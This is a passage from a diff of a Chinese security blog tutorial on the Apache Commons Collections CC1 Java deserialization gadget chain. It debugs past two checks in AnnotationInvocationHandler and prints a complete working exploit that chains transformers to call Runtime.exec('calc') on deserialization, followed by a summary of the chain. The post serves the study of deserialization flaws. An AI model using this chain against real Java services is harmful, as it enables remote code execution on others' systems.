 <h3 id="3-解决问题-②-进入到-setValue-方法"><a href="#3-解决问题-②-进入到-setValue-方法" class="headerlink" title="3. 解决问题 ② 进入到 setValue 方法"></a>3. 解决问题 ② 进入到 setValue 方法</h3><ul>
 <li>绕过两个 if，进入 <code>setValue</code> 方法。</li>
 </ul>
 <p>第一个 if 语句 <code>if (memberType != null)</code>，跳出来的原因是我们传入的 <code>memberType</code> 为 null 了，为什么会这样呢？我们去看看 <code>memberType</code> 究竟为何方神圣。</p>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/readObjectMenberType.png" class>
 
 <p>我们的传参语句</p>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/MerberType.png" class>
 
 <p>我们的要求是，传入的注解参数，是有成员变量的。<br>并且要求 <code>hashMap.put(&quot;para1&quot;, &quot;para2&quot;)</code> 中的 <code>para1</code> 与成员变量相对应。当然这是第二个 if 的事儿了。</p>
 <p>我们点进 <code>Override</code> 中，看看问题是不是出在传参上了。</p>
 <ul>
 <li>空空如也，里面是没有成员变量的，我们要去找另外的注解。</li>
 </ul>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/Override.png" class>
 
 <p>这里我们用 <code>Target.class</code> 尝试一下，点进 <code>Target</code>，当中有一个成员变量为 <code>value</code>，所以我们 <code>hashmap.put</code> 也需要修改为 <code>value</code>。</p>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/ChangePara.png" class>
 
 <p>修改完毕，我们再 debug 一下。</p>
 <p>这一次的运行我们成功进入到了 <code>setValue</code> 方法当中，但还是不能够进行弹计算器，继续分析原因。</p>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/BypassTwoIF.png" class>
 
 <p>我们继续往下跟程序，发现 <code>setValue()</code> 处中的参数并不可控，而是指定了 <code>AnnotationTypeMismatchExceptionProxy</code> 类，是无法进行命令执行的。</p>
 <p>我们需要找到一个类，能够可控 <code>setValue</code> 的参数。</p>
@@ -561,7 +561,7 @@
 <li>我们这里找到了一个能够解决 <code>setValue</code> 可控参数的类 ———— <code>ConstantTransformer</code>。</li>
 </ul>
 <p>这个类完美符合我们的要求，点进去看一看。</p>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/ConstantTransformer.png" class>
 
 <ul>
 <li>构造方法：传入的任何对象都放在 <code>iConstant</code> 中</li>
@@ -571,7 +571,7 @@
 <p>编写我们的终极 EXP</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FinalEXP;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 最终的 EXPpublic class TransformMapEXP &#123;  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class), <span class="comment">// 构造 setValue 的可控参数  </span></span><br><span class="line"> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,  </span><br><span class="line"> <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line"> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>  </span><br><span class="line"> , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line"> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line"> <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line"> HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line"> hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;drunkbaby&quot;</span>);  </span><br><span class="line"> Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);  </span><br><span class="line"> <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line"> <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);  </span><br><span class="line"> aihConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"> <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aihConstructor.newInstance(Target.class, transformedMap);  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">// 序列化反序列化  </span></span><br><span class="line"> serialize(o);  </span><br><span class="line"> unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line"> oos.writeObject(obj);  </span><br><span class="line"> &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line"> <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line"> <span class="keyword">return</span> obj;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/FinalEXP.png" class>
 
 <h2 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h2><ul>
 <li>先总结一下我们的利用链</li>
@@ -579,7 +579,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">利用链：</span><br><span class="line">InvokerTransformer#transform</span><br><span class="line">    TransformedMap#checkSetValue</span><br><span class="line">        AbstractInputCheckedMapDecorator#setValue</span><br><span class="line">            AnnotationInvocationHandler#readObject</span><br><span class="line">使用到的工具类辅助利用链：</span><br><span class="line">ConstantTransformer</span><br><span class="line">ChainedTransformer</span><br><span class="line">HashMap</span><br></pre></td></tr></table></figure>
 
 <p>这里非常建议大家在跟完一整个链子之后，写一个流程图，让自己明确一下思路，这个流程图一定是要自己写。</p>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/CC1Routine.png" class>
             </div>
 
             
